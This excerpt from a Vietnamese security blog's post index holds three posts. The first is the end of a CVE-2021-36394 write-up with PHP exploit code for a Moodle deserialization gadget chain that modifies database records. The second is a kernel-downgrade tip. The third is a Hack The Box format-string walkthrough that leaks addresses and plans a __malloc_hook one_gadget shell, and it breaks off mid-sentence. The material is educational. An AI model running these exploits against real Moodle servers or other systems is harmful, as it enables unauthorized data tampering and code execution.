qua hàm unserialize() Như vậy, trong phần này chúng ta đã thành công trong việc control input vào hàm unserialize(), bước tiếp theo tiến hành xây dựng payload khai thác.\nIII. Khai thác bằng kỹ thuật POP Mục tiêu của kỹ thuật này mình sẽ tạo một gadget chains để exploit\ngadget chains là một dãy gồm các phương thức có khả năng gọi lẫn nhau. Các phương thức này có thể cùng hoặc khác lớp. Tùy thuộc vào mã nguồn mà các chuỗi phương thức có thể gây ra sự ảnh hưởng đối với ứng dụng ít hoặc nhiều.\nTa sẽ chia ra làm 2 phần: First Link và Next Link trong đó first link là class ta truyền vào hàm unserialize() với mục tiêu sẽ trigger các magic method như __destruct() để gọi chuỗi class khác (Next Link)\nFirst Link Khi ứng dụng mắc lỗi PHP deserialize, kẻ tấn công có thể thêm bất kì đối tượng nào vào thời gian thực thi thực của chương trình, qua đó làm thay đổi tính logic và các luồng thực thi trong ứng dụng thông qua các cách sau:\nChèn các đối tượng của các lớp có định nghĩa các phương thức tự động (magic method) chắc chắn sẽ được gọi sau khi chương trình kết thúc như __destruct() hay __wakeup() khi đối tượng được tạo ra thông qua hàm unserialize(). Khi đó, chương trình sẽ có thể gọi hàng loạt các hàm khác tùy thuộc vào các lệnh trong những phương thức này.\nNgoài các magic method thông dụng như __destruct() __wakeup() thì còn có một số magic method khác được sử dụng như:\n1 2 3 4 __toString() __call() __set() __get( Chèn các đối tượng được mã nguồn thực thi một phương thức nào đó. Tương tự như trên, hàng loạt các phương thức khác sẽ được gọi và có thể dẫn tới thay đổi luồng hoạt động của chương trình.\nTrong mã nguồn logout_file_session không có thao thác ngầm ép kiểu để gọi tới __toString()\nTa tìm __destruct() trong source code, tại các folder */classes/*\nquestion: Tại sao chỉ tìm trong các folder */classes/*?\nĐể kiểm chứng, ta sẽ thử truyền class có method __destruct() khác với các class nằm trong các folder */classes/* để xem thử có trigger không! Tôi đã làm và kết quả là không trigger 😄\nBây giờ cũng làm tương tự bước trên, nhưng ta sẽ sửa mã nguồn 1 tí: tại nơi trigger hàm unserialize() ta thêm dòng lệnh\n1 include_once(\u0026#39;/var/www/html/moodle/backup/cc/cc_lib/xmlbase.php\u0026#39;) Vâng! nó trigger được! Sau đó, tôi đi tìm hiểu kĩ thì có kết luận như sau:\nMặc định 1 class chỉ có thể gọi những class nằm trong cùng thư mục hoặc cùng namespace. Mặc định của Moodle, mọi class đều có thể gọi được các class nằm ở folder có dạng ***/classes/*** Chúng ta có thể gọi tới 1 class bất kì không nằm trong ***/classes/*** khi class đó được import vào đoạn code (thông qua hàm require_once() hoặc include_once() Sau khi đọc code 3 hàm này thì link duy nhất \\core\\lock\\lock() có khả năng ứng cử vì sử dụng ép kiểu string thông qua cộng chuỗi.\nTới đây chỉ cần $this-\u0026gt;caller trỏ tới Next Link, mình có thể gọi 1 class khác chứa chain __toString() Next Link search __toString() trên toàn bộ source code. Với 136 kết quả sẽ làm đa dạng hoá gadget chain.\nMục đích của cái search này theo mình là chỉ cho thấy là có nhiều gadget chain để exploit thôi chứ cũng có gì :)))\nTác giả dựa trên 1 gadget chain của 1 bài blog Moodle – Remote Code Execution để modify lại. Do đó, để hiểu được payload tôi cần phải tìm hiểu blog trên. Một số nhận xét sau khi đọc blog như sau:\nChain này sử dụng __toString() của attribute_format với hiện thực như sau:\n1 2 3 public function __toString() { return $this-\u0026gt;determine_format()-\u0026gt;html(); } Tôi tìm kiếm trên toàn bộ source code thì thấy hàm này nằm ở moodle/grade/report/singleview/classes/local/ui/attribute_format.php __toString() được gọi khi chương trình thực hiện 1 phép nối chuỗi với biến có giá trị không phải chuỗi. Chương trình sẽ gọi __toString() để kiểm tra kiểu và convert sang chuỗi\n1 2 3 4 5 6 function block_course_overview_update_myorder($sortorder) { // $sortorder is our unserialized payload. $value = implode(\u0026#39;,\u0026#39;, $sortorder); ... set_user_preference(\u0026#39;course_overview_course_sortorder\u0026#39;, $value); } Ngữ cảnh này giống với ngữ cảnh của chúng ta khi Firstlink __destruct() tại \\core\\lock\\lock() cũng thực hiện nối chuỗi với this→caller (Giá trị this-\u0026gt;caller được kiểm soát bởi chúng ta)\nFollow của _toString() như sau:\n1 2 3 4 5 6 7 __toString() └── determine_format() └── is_disabled() ├── is_overridable_item() └── set_calculation() ├── get_record_data() └── update() Mục tiêu sẽ truyền vào giá trị vào hàm update() để thay cập nhật giá trị dưới DB.\nChain này mục đích là thay đổi dữ liệu ở dưới db. Trong bài này, mục tiêu ta sẽ sửa đổi tên nội dung khóa học ở 2 class \\grade_grade và \\grade_item Tuy nhiên, __toString() của attribute_format không gọi được vì 2 class \\grade_grade và \\grade_item nằm ngoài folder */classes/*. Do đó, để gọi được, chúng ta cần phải gọi class khác chưa hàm include class trên.\n1 2 3 4 5 6 7 8 9 10 /lib/grade/grade_grade.php ^ | /lib/gradelib.php ^ | /analytics/classes/course.php ^ | \\core_analytics\\course -\u0026gt; Gọi class \\core_analytics\\course sẽ include file /lib/grade/grade_grade.php, sau đó có thể gọi được class \\grade_grade\nTương tự với grade_item\n1 2 3 4 5 6 7 8 9 10 /lib/grade/grade_item.php ^ | /lib/gradelib.php ^ | /analytics/classes/course.php ^ | \\core_analytics\\course -\u0026gt; Gọi class \\core_analytics\\course sẽ include file /lib/grade/grade_item.php, sau đó có thể gọi được class \\grade_item\nViết exploit yeah, mọi thứ đã clear rồi. Bây giờ thì viết exploit Inject payload\n1 2 3 4 5 6 7 8 9 10 function httpGet($url, $MoodleSession) { $curl = curl_init($url); $headers = array(\u0026#39;Cookie: MoodleSession=\u0026#39;.$MoodleSession); curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); return $response; } với lời gọi hàm như sau:\n1 httpGet($url.\u0026#39;/grade/report/grader/index.php?id=1\u0026amp;sifirst=Testaaaaa|\u0026#39;.$value.\u0026#34;Testbbbbbb|\u0026#34;, $MoodleSession); Trong đó, $value là payload đã được serialize\nTrigger payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function httpPost($url, $data, $MoodleSession, $xml) { $curl = curl_init($url); $headers = array(\u0026#39;Cookie: MoodleSession=\u0026#39;.$MoodleSession); if($xml){ array_push($headers, \u0026#39;Content-Type: application/xml\u0026#39;); }else{ $data = urldecode(http_build_query($data)); } curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); curl_setopt($curl, CURLOPT_POSTFIELDS, $data); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // curl_setopt($curl, CURLOPT_PROXY, \u0026#39;127.0.0.1:8080\u0026#39;); //proxy $response = curl_exec($curl); curl_close($curl); return $response; } Với lời gọi hàm như sau:\n1 2 3 4 5 echo \u0026#34;\\n [*] Trigger Payload \u0026#34;; $data = \u0026#39;\u0026lt;s:Envelope xmlns:s=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt;\u0026lt;s:Body\u0026gt; \u0026lt;LogoutNotification\u0026gt;\u0026lt;SessionID\u0026gt;ssss\u0026lt;/SessionID\u0026gt; \u0026lt;/LogoutNotification\u0026gt;\u0026lt;/s:Body\u0026gt;\u0026lt;/s:Envelope\u0026gt;\u0026#39;; httpPost($url.\u0026#39;/auth/shibboleth/logout.php\u0026#39;, $data, $MoodleSession, 1); Yeah, Inject payload và trigger payload khá đơn giản. Câu chuyện là payload chúng ta inject như thế nào\nXây dựng payload $value\nNhư đã trình bày ở trên, khi hàm unserialize() chạy payload của chúng ta, mục tiêu nó sẽ trigger FirsLink ở \\core\\lock\\lock(), Để làm được điều đó, ta xây dựng như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 namespace core\\lock { class lock {} } function update_table($url, $MoodleSession, $table, $rowId, $column, $value){ $add_lib = new \\core_analytics\\course(); $lib_fb = new \\core\\lock\\lock(); $base = new gradereport_overview_external(); $fb = new gradereport_singleview\\local\\ui\\feedback(); $fb -\u0026gt; grade = new grade_grade(); $fb -\u0026gt; grade -\u0026gt; grade_item = new grade_item(); $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; calculation = \u0026#34;[[somestring\u0026#34;; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; calculation_normalized = false; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; table = $table; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; id = $rowId; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; $column = $value; $fb -\u0026gt; grade -\u0026gt; grade_item -\u0026gt; required_fields = array($column,\u0026#39;id\u0026#39;); $lib_fb -\u0026gt; caller = $fb; // set caller to gradereport_singleview\\local\\ui\\feedback() $arr = array($add_lib, $lib_fb,$base); } $value = serialize($arr); Tạo ra 1 $lib_fb là class \\core\\lock\\lock() Tạo class $fb là gradereport_singleview\\local\\ui\\feedback() cùng các giá trị tương ứng rồi gán vào $lib_fb -\u0026gt; caller để hàm _destruct() thực thi sẽ đi vào __toString() của feedback Trong đoạn code trên, $add_lib được tạo để include thư viện, hỗ trợ gọi 2 class \\grade_grade và \\grade_item Trong exploit còn có $base nhưng tôi thấy với mục tiêu exploit thay đổi course name thì không cần thiết, lib này sẽ phục vụ mục tiêu khác của tác giả cho những mục đích exploit khác ","description":"CVE-2021-36394 là một lỗ hổng trên nền tảng Moodle. Đây là một trong những CVE thích hợp cho những người mới bắt đầu tìm hiểu về PHP deserialize!","id":7,"section":"posts","tags":["cve, php"],"title":"Khi newbie học PHP deserialize","uri":"https://minhlongmt183.github.io/posts/cve-2021-36394-moodle-cve/"},{"content":"TIP: How to boot with an old kernel version in Ubuntu I. Mở đầu Cũng một thời gian khá lâu rồi tôi không còn viết blog nữa. Phần lớn vì tôi tập trung học các kiến thức mới. Tuy nhiên sau một thời gian nghiên cứu, tôi lại phát hiện ra viết blog là cách để tôi lưu giữ và hiểu kiến thức sâu hơn. Đồng thời, được sự khuyến khích từ mentor, tôi sẽ quay lại với thói quen viết blog này, chia sẻ, lưu trữ lại các kiến thức mình đã học!\nMột trong những vấn đề hay gặp của các bạn nghiên cứu về Kernel Exploitation là phải boot lại các phiên bản kernel cũ hơn phiên bản đang có hiện tại. Lúc mới bắt đầu, tôi đã tốn rất nhiều thời gian cho phần cài đặt này. Bài viết này tôi sẽ chỉa sẻ kinh nghiệm của tôi trong việc xây dựng boot lại 1 phiên bản kernel cũ để phục vụ quá trình nghiên cứu.\nII. Nội dung chính Context Ngữ cảnh: Phiên bản hiện tại: 5.15.0-52-generic Mục tiêu: cài kernel version 5.11 Các bước thực hiện Bước 1: vào Index of /~kernel-ppa/mainline (ubuntu.com) và chọn phiên bản mình muốn cài Tải các file có định dạng 1 2 3 4 5 6 linux-headers-xxxxxx-generic-xxxxxx_amd64.deb linux-headers-xxxxxx_all.deb linux-image-xxxxxx-generic-xxxxxx_amd64.deb linux-modules-xxxxxx-generic-xxxxxx_amd64.deb Cài đặt tất cả các file tải về 1 sudo dpkg -i *deb Khởi động lại máy. Trong trường hợp chưa được như phiên bản mong muốn, chúng ta làm tiếp các bước sau Chạy câu lệnh sau để liệt kê tất cả các phiên bản kernel hiện đang có 1 awk \u0026#39;/menuentry/ \u0026amp;\u0026amp; /class/ {count++; print count-1\u0026#34;****\u0026#34;$0 }\u0026#39; /boot/grub/grub.cfg kiểm tra chỉ số index ở đầu dòng. Linux kernel 5.11 đang ở index 5. Sau đó, chúng ta thay đổi giá trị GRUB_DEFAULT trong file /etc/default/grub như sau: 4 là trước index 5\nupdate grub 1 sudo update-grub khởi động lại máy 1 reboot sau khi khởi động lại, chúng ta kiểm tra, sẽ được phiên bản kernel như mong muốn • Khá đơn giản cho những người đã biết :)) Chúc các bạn cài đặt thành công!\n","description":"Cũng một thời gian khá lâu rồi tôi không còn viết blog nữa. Phần lớn vì tôi tập trung học các kiến thức mới. Tuy nhiên sau một thời gian nghiên cứu, tôi lại phát hiện ra viết blog là cách để tôi lưu giữ và hiểu kiến thức sâu hơn. Đồng thời, được sự khuyến khích từ mentor, tôi sẽ quay lại với thói quen viết blog này, chia sẻ, lưu trữ lại các kiến thức mình đã học! ","id":8,"section":"posts","tags":["pwn"],"title":"TIP: How to boot with an old kernel version in Ubuntu","uri":"https://minhlongmt183.github.io/posts/pwn_tip_boost_old_kernel_version/"},{"content":"Bước 1 - Phân tích Đầu tiên, chúng ta kiểm tra checksec của tệp tin 1 2 3 4 5 6 7 ➜ Format git:(main) ✗ checksec format [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Dễ dàng thấy hầu hết các cơ chế bảo mật đều được bật ở trên tệp tin này. Tựa đề là format, nên ta dễ dàng biết được đây thuộc loại lỗi format-string 1 2 3 ➜ Format git:(main) ✗ ./format %x.%x.%x.%x f0623a03.0.f0549142.3a1b8000 Ta mở bằng ghidra: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 undefined8 main(EVP_PKEY_CTX *param_1) { long lVar1; long in_FS_OFFSET; lVar1 = *(long *)(in_FS_OFFSET + 0x28); init(param_1); echo(); if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 void echo(void) { long in_FS_OFFSET; char local_118 [264]; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); do { fgets(local_118,0x100,stdin); printf(local_118); } while( true ); } Lỗi này cho phép chúng ta đọc được dữ liệu trên stack. Mở trên gdb, đặt breakpoint tại printf của hàn echo. Chạy, nhập input và dùng lệnh x/100gx $rsp để in ra dữ liệu trên stack và quan sát. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 pwndbg\u0026gt; x/100gx $rsp 0x7fffffffdc10:\t0x4141414141414141\t0x4141414141414141 0x7fffffffdc20:\t0x0000000a61414141\t0x0000038000000380 0x7fffffffdc30:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc40:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc50:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc60:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc70:\t0x0000038000000380\t0x0000038000000380 0x7fffffffdc80:\t0x0000000000000000\t0x00007ffff7fa85c0 0x7fffffffdc90:\t0x0000000000000000\t0x00007ffff7e516a5 0x7fffffffdca0:\t0x0000000000000000\t0x00007ffff7fa85c0 0x7fffffffdcb0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdcc0:\t0x00007ffff7fa94a0\t0x00007ffff7e4d6bd 0x7fffffffdcd0:\t0x00007ffff7fa85c0\t0x00007ffff7e43f65 0x7fffffffdce0:\t0x00005555555552d0\t0x00007fffffffdd20 0x7fffffffdcf0:\t0x00005555555550c0\t0x00007fffffffde30 0x7fffffffdd00:\t0x0000000000000000\t0x000055555555526d 0x7fffffffdd10:\t0x00007ffff7facfc8\t0xc53e05bd2bae9300 0x7fffffffdd20:\t0x00007fffffffdd40\t0x00005555555552b3 0x7fffffffdd30:\t0x00007fffffffde30\t0xc53e05bd2bae9300 0x7fffffffdd40:\t0x0000000000000000\t0x00007ffff7de30b3 0x7fffffffdd50:\t0x00007ffff7ffc620\t0x00007fffffffde38 0x7fffffffdd60:\t0x0000000100000000\t0x0000555555555284 0x7fffffffdd70:\t0x00005555555552d0\t0xbca385af5106ab45 0x7fffffffdd80:\t0x00005555555550c0\t0x00007fffffffde30 0x7fffffffdd90:\t0x0000000000000000\t0x0000000000000000 0x7fffffffdda0:\t0x435c7a50eba6ab45\t0x435c6a1331c8ab45 0x7fffffffddb0:\t0x0000000000000000\t0x0000000000000000 0x7fffffffddc0:\t0x0000000000000000\t0x0000000000000001 0x7fffffffddd0:\t0x00007fffffffde38\t0x00007fffffffde48 0x7fffffffdde0:\t0x00007ffff7ffe190\t0x0000000000000000 0x7fffffffddf0:\t0x0000000000000000\t0x00005555555550c0 0x7fffffffde00:\t0x00007fffffffde30\t0x0000000000000000 0x7fffffffde10:\t0x0000000000000000\t0x00005555555550ee 0x7fffffffde20:\t0x00007fffffffde28\t0x000000000000001c 0x7fffffffde30:\t0x0000000000000001\t0x00007fffffffe1be 0x7fffffffde40:\t0x0000000000000000\t0x00007fffffffe1fa 0x7fffffffde50:\t0x00007fffffffe206\t0x00007fffffffe214 0x7fffffffde60:\t0x00007fffffffe227\t0x00007fffffffe23c 0x7fffffffde70:\t0x00007fffffffe244\t0x00007fffffffe256 0x7fffffffde80:\t0x00007fffffffe292\t0x00007fffffffe29a 0x7fffffffde90:\t0x00007fffffffe2b1\t0x00007fffffffe2cd 0x7fffffffdea0:\t0x00007fffffffe2ed\t0x00007fffffffe309 0x7fffffffdeb0:\t0x00007fffffffe329\t0x00007fffffffe334 0x7fffffffdec0:\t0x00007fffffffe344\t0x00007fffffffe356 0x7fffffffded0:\t0x00007fffffffe3b2\t0x00007fffffffe3d0 0x7fffffffdee0:\t0x00007fffffffe3e4\t0x00007fffffffe41a 0x7fffffffdef0:\t0x00007fffffffe42c\t0x00007fffffffe43b 0x7fffffffdf00:\t0x00007fffffffe479\t0x00007fffffffe490 0x7fffffffdf10:\t0x00007fffffffe4c3\t0x00007fffffffe4da 0x7fffffffdf20:\t0x00007fffffffe4ea\t0x00007fffffffe4fe Chúng ta thấy có 1 vài giá trị có địa chỉ là 0x5555*** trên stack. Kiểm tra các giá trị này với lệnh x/i dia_chi 1 2 3 4 5 6 7 8 9 10 pwndbg\u0026gt; x/i 0x00005555555552d0 0x5555555552d0 \u0026lt;__libc_csu_init\u0026gt;:\tendbr64 pwndbg\u0026gt; x/i 0x00005555555550c0 0x5555555550c0 \u0026lt;_start\u0026gt;:\tendbr64 pwndbg\u0026gt; x/i 0x000055555555526d 0x55555555526d \u0026lt;init+117\u0026gt;:\tnop pwndbg\u0026gt; x/i 0x00005555555552b3 0x5555555552b3 \u0026lt;main+47\u0026gt;:\tmov eax,0x0 pwndbg\u0026gt; x/i 0x00005555555550ee 0x5555555550ee \u0026lt;_start+46\u0026gt;:\thlt Mặt khác, lỗi format-string có thể cho phép chúng ta dump dữ liệu trên stack. Chúng ta sẽ viết 1 đoạn code nhỏ để dump dữ liệu từ stack ra. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 from pwn import * # HOST = \u0026#39;64.227.36.245\u0026#39; # PORT = 30730 context.clear(arch=\u0026#34;amd64\u0026#34;) # ----------------------- def com(payload, wait=True): global r r.sendline(payload) if (wait): return r.recv() def nonStopLeak(): data = [] min_val = 1 max_val = 50 log.progress(\u0026#34;Starting nonStopLeaking (range: %d to %d)...\u0026#34; % (min_val, max_val)) data.append(\u0026#34;EMPTY ON PURPOSE\u0026#34;) for i in range(min_val, max_val): leak = \u0026#34;%{}$lx\u0026#34;.format(i) leak = com(leak).strip().decode() data.append(leak) log.success(\u0026#34;nonStopLeaking finalized...\u0026#34;) return data # -------------- exploit ----------------------- elf = ELF(\u0026#34;format\u0026#34;) r = process(\u0026#34;./format\u0026#34;) # input(\u0026#34;[+] attach gdb\u0026#34;) # Launch the fmtstr exploiter exploiter = FmtStr(com) collected_data = nonStopLeak() print(collected_data) r.interactive() Tiến hành chạy, ta được kết quả: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ➜ Format git:(main) ✗ python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./format\u0026#39;: pid 13390 [+] attach gdb [*] Found format string offset: 6 [▆] Starting nonStopLeaking (range: 1 to 40)... exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes r.sendline(payload) [+] nonStopLeaking finalized... [\u0026#39;EMPTY ON PURPOSE\u0026#39;, \u0026#39;7f2bcf7e9a03\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf70f142\u0026#39;, \u0026#39;7fff990a1ad0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;61000a786c243625\u0026#39;, \u0026#39;6161616461616163\u0026#39;, \u0026#39;5241545361616165\u0026#39;, \u0026#39;444e457024362554\u0026#39;, \u0026#39;3800000000a\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;38000000380\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf6936a5\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;7f2bcf7eb4a0\u0026#39;, \u0026#39;7f2bcf68f6bd\u0026#39;, \u0026#39;7f2bcf7ea5c0\u0026#39;, \u0026#39;7f2bcf685f65\u0026#39;, \u0026#39;55ddf1fb92d0\u0026#39;, \u0026#39;7fff990a1be0\u0026#39;, \u0026#39;55ddf1fb90c0\u0026#39;, \u0026#39;7fff990a1cf0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;55ddf1fb926d\u0026#39;, \u0026#39;7f2bcf7eefc8\u0026#39;, \u0026#39;cdd017be270afb00\u0026#39;] [*] Switching to interactive mode Tại đây, mình thấy có giá trị 0x55ddf1fb926d là địa chỉ tại vị trí init+117, mình sẽ dùng giá trị này để tính base address, bypass cơ chế ASLR và giá trị này nó nằm ở bye thứ 37. 1 2 3 4 ➜ Format git:(main) ✗ ./format ➜ Format git:(main) ✗ ./format %37$p 0x56406ae4f26d Do cơ chế ASLR nên giá trị này sẽ khác ở mỗi lần chạy. Bước thứ nhất, chúng ta sẽ vượt qua được cơ chế ASLR với đoạn code sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 from pwn import * # HOST = \u0026#39;64.227.36.245\u0026#39; # PORT = 30730 context.clear(arch=\u0026#34;amd64\u0026#34;) # ----------------------- def com(payload, wait=True): global r r.sendline(payload) if (wait): return r.recv() def nonStopLeak(): data = [] min_val = 1 max_val = 40 log.progress(\u0026#34;Starting nonStopLeaking (range: %d to %d)...\u0026#34; % (min_val, max_val)) data.append(\u0026#34;EMPTY ON PURPOSE\u0026#34;) for i in range(min_val, max_val): leak = \u0026#34;%{}$lx\u0026#34;.format(i) leak = com(leak).strip().decode() data.append(leak) log.success(\u0026#34;nonStopLeaking finalized...\u0026#34;) return data # -------------- exploit ----------------------- elf = ELF(\u0026#34;./format\u0026#34;) init_117 = 0x126d r = process(\u0026#34;./format\u0026#34;) input(\u0026#34;[+] attach gdb\u0026#34;) payload = b\u0026#39;%37$p\u0026#39; r.sendline(payload) init_leak = r.recvline() log.success(\u0026#34;LEAK : init+117 address: {}\u0026#34;.format(init_leak)) base_elf = int(init_leak,16) - 0x126d log.info(\u0026#34;Base ELF address: {}\u0026#34;.format(hex(base_elf))) elf.address = base_elf Bước 2: Leak địa chỉ __printf từ libc thông qua printf() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 pwndbg\u0026gt; disassemble echo Dump of assembler code for function echo: 0x0000559e0bc191a9 \u0026lt;+0\u0026gt;:\tendbr64 0x0000559e0bc191ad \u0026lt;+4\u0026gt;:\tpush rbp 0x0000559e0bc191ae \u0026lt;+5\u0026gt;:\tmov rbp,rsp 0x0000559e0bc191b1 \u0026lt;+8\u0026gt;:\tsub rsp,0x110 0x0000559e0bc191b8 \u0026lt;+15\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x0000559e0bc191c1 \u0026lt;+24\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax 0x0000559e0bc191c5 \u0026lt;+28\u0026gt;:\txor eax,eax 0x0000559e0bc191c7 \u0026lt;+30\u0026gt;:\tmov rdx,QWORD PTR [rip+0x2e62] # 0x559e0bc1c030 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000559e0bc191ce \u0026lt;+37\u0026gt;:\tlea rax,[rbp-0x110] 0x0000559e0bc191d5 \u0026lt;+44\u0026gt;:\tmov esi,0x100 0x0000559e0bc191da \u0026lt;+49\u0026gt;:\tmov rdi,rax 0x0000559e0bc191dd \u0026lt;+52\u0026gt;:\tcall 0x559e0bc190a0 \u0026lt;fgets@plt\u0026gt; 0x0000559e0bc191e2 \u0026lt;+57\u0026gt;:\tlea rax,[rbp-0x110] 0x0000559e0bc191e9 \u0026lt;+64\u0026gt;:\tmov rdi,rax 0x0000559e0bc191ec \u0026lt;+67\u0026gt;:\tmov eax,0x0 0x0000559e0bc191f1 \u0026lt;+72\u0026gt;:\tcall 0x559e0bc19090 \u0026lt;printf@plt\u0026gt; 0x0000559e0bc191f6 \u0026lt;+77\u0026gt;:\tjmp 0x559e0bc191c7 \u0026lt;echo+30\u0026gt; End of assembler dump. pwndbg\u0026gt; disassemble 0x559e0bc19090 Dump of assembler code for function printf@plt: 0x0000559e0bc19090 \u0026lt;+0\u0026gt;:\tendbr64 0x0000559e0bc19094 \u0026lt;+4\u0026gt;:\tbnd jmp QWORD PTR [rip+0x2f25] # 0x559e0bc1bfc0 \u0026lt;printf@got.plt\u0026gt; 0x0000559e0bc1909b \u0026lt;+11\u0026gt;:\tnop DWORD PTR [rax+rax*1+0x0] End of assembler dump. pwndbg\u0026gt; Chúng ta sử dụng %s thay vì %p bởi vì %s sẽ đọc địa giá trị bên trong vùng nhớ được truyền vào printf và in ra cho đến khi gặp giá trị null. Điều đó có nghĩa nếu địa chỉ của vùng GOT được đưa vào thì chúng ta có thể in nó sẽ in ra địa chỉ của libc đang chứa trong nó. Cụ thể chúng ta sẽ thực hiện như sau: 1 2 3 4 5 6 7 8 9 ... # ------------- Leaking _printf address through printf() printf_got_ptl = elf.got[\u0026#34;printf\u0026#34;] log.info(\u0026#34;printf@got.plt address: {}\u0026#34;.format(hex(printf_got_ptl))) r.sendline(b\u0026#39;AAAA%7$s\u0026#39; + p64(printf_got_ptl)) printf_leak = r.recv() printf_libc = u64(printf_leak[4:10].ljust(8, b\u0026#39;\\x00\u0026#39;)) log.success(\u0026#34;Leaked __printf: {}\u0026#34;.format(hex(printf_libc))) ... Chúng ta lấy địa chỉ printf@plt thông qua lệnh elf.got[\u0026quot;printf\u0026quot;], sau đó gửi payload có dạng \u0026quot;AAAA%7$s\u0026quot; + p64(printf_got_ptl). Số 7 ở đây là vì địa chỉ của got p64(printf_got_ptl) năm ở vị trí thứ 7 trên stack, do đó %7s sẽ lấy địa chỉ này ra và in giá trị chứa trong nó cũng chính là địa chỉ libc. Lệnh ljust(8, \u0026quot;\\x00\u0026quot;) được dùng để thêm các gía trị \\x00 vì cơ chế align 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ➜ Format git:(main) ✗ python3 exploit.py [*] \u0026#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;./format\u0026#39;: pid 15866 [+] attach gdb [+] LEAK : init+117 address: b\u0026#39;0x563d767e026d\\n\u0026#39; [*] Base ELF address: 0x563d767df000 [*] printf@got.plt address: 0x563d767e2fc0 [+] Leaked __printf: 0x7fc6d53d6e10 [*] Stopped process \u0026#39;./format\u0026#39; (pid 15866) Sử dụng libc.blukat.me và địa chỉ của libc vừa có được để kiểm tra phiên bản của libc. Bước 3 chiếm quyền điều khiển Khi kiểm tra với checksec, chúng ta thấy rằng binary được setup với Full RELRO, điều đó có nghĩa chúng ta không thể ghi đè lên GOT, tuy nhiên nội dung của thư viện libc chúng ta vẫn có thể ghi đực. Do đó, mục tiêu sẽ ghi đè lên con trỏ __malloc_hook Khi chúng ta gửi vào printf() chuỗi quá lớn, __malloc_hook được gọi bất cứ khi nào malloc() được dùng. Chúng ta gọi malloc() bằng cách gọi printf(\u0026quot;%100000$c\u0026quot;), lệnh gọi này sẽ cấp phát nhiều byte trên stack và buộc libc phải cấp phát thêm vùng nhớ trên heap thay vì trên stack. Khi đó, chúng ta có thể ghi đè giá trị của __malloc_hook bằng %6n và thay AAAA đầu thành địa chỉ của __malloc_hook. Chúng ta sử dụng kĩ thuật one_gadget để thực thi execve(\u0026quot;/bin/sh\u0026quot;) trong libc. 1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ Format git:(main) ✗ one_gadget libc6_2.27-3ubuntu1_amd64.so 0x4f2c5 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints: rsp \u0026amp; 0xf == 0 rcx == NULL 0x4f322 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL Tiếp theo, chúng ta tính các địa chỉ cần thiết. Với libc khi chưa chạy, 